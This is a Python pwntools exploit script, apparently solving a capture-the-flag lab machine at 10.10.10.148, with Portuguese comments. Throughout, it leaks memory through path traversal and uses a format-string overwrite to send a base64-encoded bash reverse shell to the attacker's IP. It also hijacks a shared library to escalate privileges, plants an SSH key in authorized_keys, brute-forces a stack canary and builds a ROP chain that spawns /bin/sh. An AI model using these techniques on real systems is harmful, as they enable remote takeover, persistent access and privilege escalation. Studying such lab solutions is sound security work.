#!/usr/bin/python3
#coding: utf-8


from pwn import *
from base64 import b64encode
from time import sleep
import requests
import os
import urllib
import multiprocessing
import sys
import subprocess


# Variáveis Globais
SPACE_IN_BASH = '${IFS}'
OFFSET = 53
IP = os.popen(
	"ifconfig tun0 | sed -n 2p | awk '{print $2}'").read().strip()
RHOST = "10.10.10.148"
RPORT = 9999
LPORT = 4444
LOCAL_HOST = "0.0.0.0"
CONTACT_BINARY_PORT = 1337


def clean():
	sys.stdout.write("\033[F")
	sys.stdout.write("\033[K")


def valueBruteForce(offset, opt=b""):
	value = b""
	while len(value) < 8:
		for byte in range(0x100):
			payload = b""
			payload += b"A" * offset
			payload += opt
			payload += value
			payload += p8(byte)

			io = remote(LOCAL_HOST, CONTACT_BINARY_PORT)
			clean()
			io.recvuntil("admin:\n")
			io.send(payload)

			try:
				out = io.recvuntil("Done.\n", timeout=1)

				if b"Done.\n" not in out:
					raise EOFError
				log.info(f"Byte found: {hex(byte)}")
				value += p8(byte)
				io.close()
				clean()
				break

			except EOFError:
				io.close()
				clean()
	return u64(value)


def main():

	shell = listen(LPORT)

	infoVar = log.progress("Getting Info Memory From server")
	infoVar.status("Connecting...")
	header = {"Range": "bytes=0-2000000"}
	req = requests.get(
		f"http://{RHOST}:{RPORT}//proc/self/maps", headers=header)
	sleep(2)

	# /opt/www/httpserver
	# /lib32/libc-2.27.so

	infoVar1 = log.progress("Vulnerable target server (port 9999)")
	infoVar1.status("Download...")

	os.system('wget "http://10.10.10.148:9999//opt/www/httpserver"')
	os.system('wget "http://10.10.10.148:9999//lib32/libc-2.27.so"')

	infoVar1.success("Done")

	if req.ok:
		infoVar.success("Request as been sended")
		pieBase = int(req.text.split("-")[0], 16)
		libcBase = int(req.text.split("[heap]")[1].split("-")[0], 16)
		log.info(f"PIE BASE  : {hex(pieBase)}")
		log.info(f"LIBC BASE : {hex(libcBase)}")
		sleep(2)
		print()
	else:
		infoVar.failure("We don't have a response from the server")
		sys.exit(1)

	infoVar2 = log.progress("Calculating dynamic memory addresses")
	infoVar2.status("Calculating...")
	sleep(2)
	binary = ELF('./httpserver', checksec=False)
	libc = ELF("./libc-2.27.so", checksec=False)
	puts = pieBase + binary.got["puts"]
	system = libcBase + libc.symbols['system']
	log.info(f"PUTS      : {hex(puts)}")
	log.info(f"SYSTEM    : {hex(system)}")
	infoVar2.success("Done!")
	sleep(2)
	print()

	infoVar3 = log.progress("Payload")
	infoVar3.status("Creating...")
	sleep(2)
	formatPayload = {puts: system}
	payload = fmtstr_payload(OFFSET, formatPayload)
	reverseShell = b64encode(
		f"bash -c 'exec bash -i &>/dev/tcp/{IP}/4444 <&1'".encode()).decode()
	infoVar3.success("Done!")
	sleep(2)

	infoVar4 = log.progress("Reverse Shell")
	infoVar4.status("Sending...")
	sleep(2)

	p = remote(RHOST, RPORT)
	p.send(f'echo{SPACE_IN_BASH}"{reverseShell}"|base64{SPACE_IN_BASH}-d|bash /{urllib.parse.quote(payload)} HTTP/1.1\r\n\r\n')

	shell.wait_for_connection()
	if shell.connected:
		infoVar4.success("Tumba Pâ Dentro!")
		print()
		print()
	else:
		infoVar4.failure("Something went wrong! =(")
		log.failure("Exiting...")
		sys.exit(1)

	# Transversal PrivEsc
	infoVar5 = log.progress("Library Hijacking")
	infoVar5.status("Creating new liblog.c...")
	shell.sendline("touch /dev/shm/liblog.c")
	shell.sendline('echo "#include <stdio.h>" > /dev/shm/liblog.c')
	shell.sendline('echo "#include <stdlib.h>" >> /dev/shm/liblog.c')
	shell.sendline('echo  >> /dev/shm/liblog.c')
	shell.sendline('echo "int printlog(void){" >> /dev/shm/liblog.c')
	shell.sendline(
		'echo "        setresuid(1000, 1000, 1000);" >> /dev/shm/liblog.c')
	shell.sendline(
		"""echo "        system(\\"/bin/bash\\");" >> /dev/shm/liblog.c""")
	shell.sendline('echo "}" >> /dev/shm/liblog.c')
	sleep(2)
	infoVar5.status("Malicious liblog.c created...")
	sleep(2)
	infoVar5.status("Compiling...")
	shell.sendline("gcc -shared -o /dev/shm/liblog.so /dev/shm/liblog.c")
	sleep(2)
	infoVar5.status("Saving original liblog.so in /dev/shm/liblog.so.bak")
	shell.sendline("cp /lib/x86_64-linux-gnu/liblog.so /dev/shm/liblog.so.bak")
	sleep(2)
	infoVar5.status("Replacing liblog.so with malicious liblog.so")
	shell.sendline("cat /dev/shm/liblog.so > /lib/x86_64-linux-gnu/liblog.so")
	sleep(2)
	infoVar5.success("GG!!")

	infoVar6 = log.progress("Transversal PrivEsc")
	infoVar6.status("Changing user")
	shell.sendline("sudo -u r4j /usr/bin/readlogs")
	sleep(2)
	infoVar6.success("Hello World Mr. r4j! =)")

	flags = shell.sendline(
		"echo -n '    [*] User Flag => '; cat /home/r4j/user.txt")

	infoVar6 = log.progress("Download of vulnerable binary")
	infoVar6.status("Downloading contact...")
	shell.sendline("cd /opt/support")
	shell.sendline("nohup python3 -m http.server &")
	sleep(2)
	os.system(f"wget http://{RHOST}:8000/contact")
	infoVar6.status("contact downloaded")
	sleep(2)
	shell.sendline("killall python3")

	infoVar6.status("Downloading libc.so.6...")
	shell.sendline("cd /lib/x86_64-linux-gnu/")
	shell.sendline("nohup python3 -m http.server &")
	sleep(2)
	os.system(f"wget http://{RHOST}:8000/libc.so.6")
	infoVar6.status("libc.so.6 downloaded")
	sleep(2)
	shell.sendline("killall python3")
	infoVar6.success("All Done!")

	infoVar7 = log.progress("Port forwarding")
	infoVar7.status("Connecting...")
	shell.sendline("mkdir /home/r4j/.ssh")
	shell.sendline("""echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDMqoQqTiJhU9ROWmdjr9uhULd+PXB6GPkdHtFE7hss3UbRTdOHQaVR46jzDYDyb5N+c2jL99Prh1o68RIRq8JjkvXcRKVoaXB6rPGKZ7hGuCBRwfpogpVKdz+6bwsbwLQSceSENpEnBMFQtWZ/VGkiWUxqF4WNk5LtqyAAS42JF9RJ6VsW5daT8R+5OkmX5a4+ysaNkbPXAnMcD9Nm07NnC4ZjWQe3FAn7GxT0CwgromlEnj1XZa+m9e+4q383dq21vfZEnjPdbJqi550hYobc4TWX9FXd+Z6uitkei0eq9qBbuE+wcj7EVsHEPO2NkE9qJk2sCZDfe5QnmZZBTDr6CQZ0r4BlyFhwisygTzJdoiV4DVnGsXmCNyT7TEHiMvb6oxXr0jkVrfMt+XTFJlU5gOOMDqCHWHPeUrsZLarTBcDNhZp/VthDHgNU5TIIXrQiyvEkHsL/rEypbLZlDjFqoTccIxP3Xv6Tk6ELCzkvc3eyR+PMAev52pnloTxbADU= javali@PC-Santarem" > /home/r4j/.ssh/authorized_keys""")

	sleep(2)
	input("\n\n[ ! ] Open a new terminal, and run this line in parallel:\n\n\tssh -L 127.0.0.1:1337:127.0.0.1:1337 r4j@10.10.10.148\n\n[ ? ] Press any key when ready...")

	sleep(2)
	infoVar7.success("My LocalHost:1337 is now the same as the target")
	sleep(2)

	# AGORA È QUE SÃO ELAS!!

	# context.log_level = "DEBUG"

	Local = False

	elf = ELF("./contact", checksec=False)

	if Local:
		libc = ELF("/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
	else:
		libc = ELF("./libc.so.6", checksec=False)

	print()
	print()
	log1 = log.progress("Bruteforcing Canary Byte")
	log1.status("Bruteforcing...")
	canary = valueBruteForce(0x38)
	# canary = 0x797ce4e05fe0ba00
	log.success(f"Canary found: {hex(canary)}")
	log1.success("Done!")

	print()
	print()
	log2 = log.progress("Bruteforcing stored RBP address...")
	# log2.status("Bruteforcing...")
	rbpAddress = valueBruteForce(0x38, p64(canary))
	rbpAddress = 0x7ffcc5790750
	log.success(f"Stored RBP address found: {hex(rbpAddress)}")
	log2.success("Done!")

	print()
	print()
	log3 = log.progress("Bruteforcing stored return Address...")
	# log3.status("Bruteforcing...")
	retAddress = valueBruteForce(0x38, p64(canary) + p64(rbpAddress))
	retAddress = 0x55de2a3a7562
	log.success(f"Stored return Address: {hex(retAddress)}")
	log3.success("Done!")

	print()
	print()

	if retAddress & 0xff == 0x62:
		elf.address = retAddress - 0x1562
	else:
		elf.address = retAddress - 0x1556

	log.info(f"PIE base address: {hex(elf.address)}")

	leak = flat(
		"A" * 0x38,
		canary,
		rbpAddress,
		elf.address + 0x164b,
		0x4,
		elf.address + 0x1649,
		elf.got["fork"],
		0x0,
		elf.address + 0x1265,
		0x8,
		elf.sym["write"],
		endianness="little",
		word_size=64,
		sign=False)

	io = remote(LOCAL_HOST, CONTACT_BINARY_PORT)
	clean()
	io.recvuntil("admin:\n")
	io.send(leak)
	forkAddress = u64(io.recv(8))
	libc.address = forkAddress - libc.sym["fork"]
	log.success(f"Leaked fork of LIBC address: {hex(forkAddress)}")
	log.info(f"GLIBC base address: {hex(libc.address)}")
	io.close()
	clean()

	shell = flat(
		"A" * 0x38,
		canary,
		rbpAddress,
		elf.address + 0x164b,
		0x4,
		elf.address + 0x1649,
		0x0,
		0x0,
		libc.sym["dup2"],
		elf.address + 0x164b,
		0x4,
		elf.address + 0x1649,
		0x1,
		0x0,
		libc.sym["dup2"],
		elf.address + 0x164b,
		libc.search(b"/bin/sh\x00").__next__(),
		elf.address + 0x1016,
		libc.sym["system"],
		endianness="little",
		word_size=64,
		sign=False

	)

	log.info("Spawning Shell...")

	io = remote(LOCAL_HOST, CONTACT_BINARY_PORT)
	clean()
	io.send(shell)

	io.interactive()
	io.close()

	# Clean final e recuperação da shell interactiva

	test = shell.sendline(
		"echo -n '    [*] User Flag => '; cat /home/r4j/user.txt")
	test = shell.sendline(
		"echo -n '    [*] Root Flag => '; cat /root/root.txt")

	shell.clean()

	shell.sendline("script /dev/null -c bash")
	shell.sendline("stty rows 57 columns 234")

	shell.clean()
	shell.interactive()


try:
	main()
except Exception as e:
	log.failure(str(e))
	log.failure("Something went wrong! =(")
	sys.exit(1)
